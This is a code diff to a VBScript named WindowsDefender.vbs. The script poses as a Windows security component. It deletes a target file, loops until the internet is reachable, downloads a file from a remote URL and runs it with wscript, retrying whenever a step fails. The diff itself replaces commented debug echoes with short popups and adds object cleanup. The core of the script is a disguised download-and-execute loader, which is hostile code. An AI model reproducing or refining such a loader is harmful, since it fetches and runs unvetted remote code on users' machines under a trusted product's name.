+++ Resources/WindowsDefender.vbs
@@ -18,10 +18,10 @@ Start()
 
 sub Start()
 	If objFSO.FileExists(toRun) Then
-		'WScript.Echo "File Exists (from WindowsDefender.vbs)" 
+        WshShell.Popup "File Exists (from WindowsDefender.vbs)", 2, "Start()", 64
 		objFSO.DeleteFile toRun, True '[force deletion]
 	Else
-		'WScript.Echo "File Doesn't Exists (from WindowsDefender.vbs)"
+        WshShell.Popup "File Doesn't Exists (from WindowsDefender.vbs)", 2, "Start()", 64
 	End If
 	CheckInternetConnection
 End sub
@@ -33,14 +33,17 @@ sub CheckInternetConnection()
     objHTTP.send ""
     On Error GoTo 0
     If objHTTP.status = 200 Then
-        'WScript.Echo "Internet is connected! (from WindowsDefender.vbs)"
+        WshShell.Popup "Internet is connected! (from WindowsDefender.vbs)", 2, "CheckInternetConnection()", 64
+        Set objHTTP = Nothing
 		DownloadFile
 		RunScript
     Else
-		'WScript.Echo "Internet is not connected! (from WindowsDefender.vbs)"
+        WshShell.Popup "Internet is not connected! (from WindowsDefender.vbs), retrying in 10 seconds..", 2, "CheckInternetConnection()", 64
 		WScript.Sleep 10000 ' 10 seconds
+        Set objHTTP = Nothing
 		CheckInternetConnection
     End If
+    Set objHTTP = Nothing
 End sub
 
 sub DownloadFile()
@@ -57,7 +60,15 @@ sub DownloadFile()
 
     ' Handle errors during the request
     If Err.Number <> 0 Then
-        'WScript.Echo "Error during download request: " & Err.Description
+        WshShell.Popup "Error during download request: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
+        WScript.Sleep 10000 ' 10 seconds
+        ' Clean up
+        
+        Set objXMLHTTP = Nothing
+        Set objADOStream = Nothing
+        Set objFSO = Nothing
+    
+        DownloadFile
         Exit Sub
     End If
 
@@ -75,12 +86,20 @@ sub DownloadFile()
 
     ' Handle errors during the file save
     If Err.Number <> 0 Then
-        'WScript.Echo "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs)"
+        
+        WshShell.Popup "Error saving the file: " & Err.Description & "(from WindowsDefender.vbs), Retrying in 10 seconds ..", 2, "DownloadFile()", 64
+        
         WScript.Sleep 10000 ' 10 seconds
+        ' Clean up
+        
+        Set objXMLHTTP = Nothing
+        Set objADOStream = Nothing
+        Set objFSO = Nothing
+    
         DownloadFile
 		Exit Sub
     Else
-        'WScript.Echo "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)"
+        WshShell.Popup "Downloaded " & downloadedFilename & " successfully. (from WindowsDefender.vbs)", 2, "DownloadFile()", 64
     End If
 
     On Error GoTo 0 ' Disable error handling
@@ -94,8 +113,16 @@ sub RunScript()
 	If objFSO.FileExists(scriptPath) Then
         CreateObject("WScript.Shell").Run "wscript """ & scriptPath & """", 1, True
     Else
-        'WScript.Echo "Error: Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs)"
+        WshShell.Popup "Script file not found at path: " & scriptPath & "(from WindowsDefender.vbs), Retrying everything in 10 seconds ..", 2, "RunScript()", 64
         WScript.Sleep 10000 ' 10 seconds
         Start
     End If
 End sub
+
+Set objFSO = Nothing
+Set url = Nothing
+Set toRun = Nothing
+Set downloadURL = Nothing
+Set downloadDirectory = Nothing
+Set downloadedFilename = Nothing
+Set scriptPath = Nothing
